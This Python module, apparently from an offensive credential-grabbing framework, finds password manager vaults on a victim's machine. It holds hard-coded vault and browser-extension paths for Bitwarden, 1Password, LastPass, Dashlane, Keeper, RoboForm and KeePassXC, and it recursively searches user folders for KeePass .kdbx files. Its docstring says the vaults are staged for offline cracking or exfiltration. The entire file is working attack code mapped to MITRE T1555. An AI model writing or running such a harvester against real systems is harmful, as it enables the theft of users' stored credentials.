"""
PasswordMgrGrabber -- Discover password manager local vault files

Password managers are THE target on any engagement. Even if the vaults
are encrypted, discovering and staging them for offline cracking or
exfiltration is critical.

Targets:
- Bitwarden (desktop app + browser extension)
- 1Password (desktop app)
- KeePass / KeePassXC (.kdbx files in common locations)
- LastPass (Chrome extension LevelDB)
- Dashlane (local profile data)
- Keeper (local vault data)
- RoboForm (local profiles)

MITRE ATT&CK: T1555 (Credentials from Password Stores)
"""

from __future__ import annotations

import os

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel


# (app_name, path_template, file_patterns, description)
_PASSWORD_MGR_TARGETS = [
    # Bitwarden desktop app
    (
        "Bitwarden",
        "{appdata}/Bitwarden/data.json",
        None,
        "Bitwarden vault (encrypted JSON)",
    ),
    # Bitwarden Chrome extension
    (
        "Bitwarden (Chrome Extension)",
        "{localappdata}/Google/Chrome/User Data/Default/Local Extension Settings/nngceckbapebfimnlniiiahkandclblb",
        None,
        "Bitwarden Chrome extension LevelDB",
    ),
    # 1Password
    (
        "1Password",
        "{localappdata}/1Password/data",
        None,
        "1Password local vault data",
    ),
    (
        "1Password",
        "{appdata}/1Password/data",
        None,
        "1Password local vault data",
    ),
    # LastPass Chrome extension
    (
        "LastPass (Chrome Extension)",
        "{localappdata}/Google/Chrome/User Data/Default/Local Extension Settings/hdokiejnpimakedhajhdlcegeplioahd",
        None,
        "LastPass Chrome extension LevelDB",
    ),
    # LastPass Edge extension
    (
        "LastPass (Edge Extension)",
        "{localappdata}/Microsoft/Edge/User Data/Default/Local Extension Settings/bbcinlkgjjkejfdpemiealijmmooekci",
        None,
        "LastPass Edge extension LevelDB",
    ),
    # Dashlane
    (
        "Dashlane",
        "{appdata}/Dashlane/profiles",
        None,
        "Dashlane local profiles",
    ),
    # Keeper
    (
        "Keeper",
        "{localappdata}/Keeper",
        None,
        "Keeper local vault data",
    ),
    # RoboForm
    (
        "RoboForm",
        "{localappdata}/RoboForm/Profiles",
        None,
        "RoboForm saved profiles",
    ),
    # KeePassXC
    (
        "KeePassXC",
        "{appdata}/KeePassXC",
        None,
        "KeePassXC configuration (may reveal DB paths)",
    ),
    # macOS / Linux
    (
        "Bitwarden",
        "{home}/.config/Bitwarden/data.json",
        None,
        "Bitwarden vault (Linux/macOS)",
    ),
    (
        "1Password",
        "{home}/.config/1Password/data",
        None,
        "1Password vault (Linux)",
    ),
    (
        "KeePassXC",
        "{home}/.config/keepassxc",
        None,
        "KeePassXC config (Linux/macOS)",
    ),
]

# Common locations to search for .kdbx files
_KDBX_SEARCH_DIRS = [
    "{home}/Documents",
    "{home}/Desktop",
    "{home}/Downloads",
    "{home}/OneDrive",
    "{home}/Dropbox",
]


class PasswordMgrGrabber(GrabberModule):
    name = "password_mgr"
    description = "Discover password manager vaults (Bitwarden, 1Password, LastPass, KeePass, Dashlane)"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    def preflight_check(self, context: GrabberContext) -> bool:
        for app, template, _, _ in _PASSWORD_MGR_TARGETS:
            path = self._expand(template, context)
            if path and (os.path.isfile(path) or os.path.isdir(path)):
                return True
        # Also check for .kdbx files
        for template in _KDBX_SEARCH_DIRS:
            path = self._expand(template, context)
            if path and os.path.isdir(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Check known password manager locations
        for app_name, template, _, description in _PASSWORD_MGR_TARGETS:
            path = self._expand(template, context)
            if not path:
                continue

            if os.path.isfile(path):
                size = 0
                try:
                    size = os.path.getsize(path)
                except OSError:
                    pass

                result.credentials.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="key",
                    target_application=app_name,
                    url=path,
                    notes=f"{description} ({size:,} bytes)",
                    mitre_technique="T1555",
                    source_file=path,
                ))
                result.findings.append(self.make_finding(
                    file_path=path,
                    description=f"{app_name} vault file found",
                    score=200,  # CRITICAL -- password manager vault
                    matched_value=app_name,
                ))

            elif os.path.isdir(path):
                # Count files in the directory
                file_count = 0
                total_size = 0
                try:
                    for entry in os.scandir(path):
                        if entry.is_file():
                            file_count += 1
                            try:
                                total_size += entry.stat().st_size
                            except OSError:
                                pass
                except (PermissionError, OSError):
                    pass

                if file_count > 0:
                    result.credentials.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="key",
                        target_application=app_name,
                        url=path,
                        notes=f"{description} ({file_count} files, {total_size:,} bytes)",
                        mitre_technique="T1555",
                        source_file=path,
                    ))
                    result.findings.append(self.make_finding(
                        file_path=path,
                        description=f"{app_name} data directory ({file_count} files)",
                        score=175,
                        matched_value=app_name,
                    ))

        # Search common directories for .kdbx files
        for template in _KDBX_SEARCH_DIRS:
            search_dir = self._expand(template, context)
            if not search_dir or not os.path.isdir(search_dir):
                continue

            try:
                for root, dirs, files in os.walk(search_dir):
                    for fname in files:
                        if fname.lower().endswith(('.kdbx', '.kdb')):
                            fpath = os.path.join(root, fname)
                            try:
                                size = os.path.getsize(fpath)
                            except OSError:
                                size = 0

                            result.credentials.append(ExtractedCredential(
                                source_module=self.name,
                                credential_type="key",
                                target_application="KeePass",
                                url=fpath,
                                notes=f"KeePass database ({size:,} bytes)",
                                mitre_technique="T1555",
                                source_file=fpath,
                            ))
                            result.findings.append(self.make_finding(
                                file_path=fpath,
                                description=f"KeePass database: {fname}",
                                score=200,  # CRITICAL
                                matched_value=fname,
                            ))

                    # Don't recurse too deep
                    if root.count(os.sep) - search_dir.count(os.sep) > 3:
                        dirs.clear()
            except (PermissionError, OSError):
                continue

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _expand(template: str, context: GrabberContext) -> str:
        return template.format(
            appdata=context.appdata_roaming or "",
            localappdata=context.appdata_local or "",
            home=context.user_profile_path,
        )
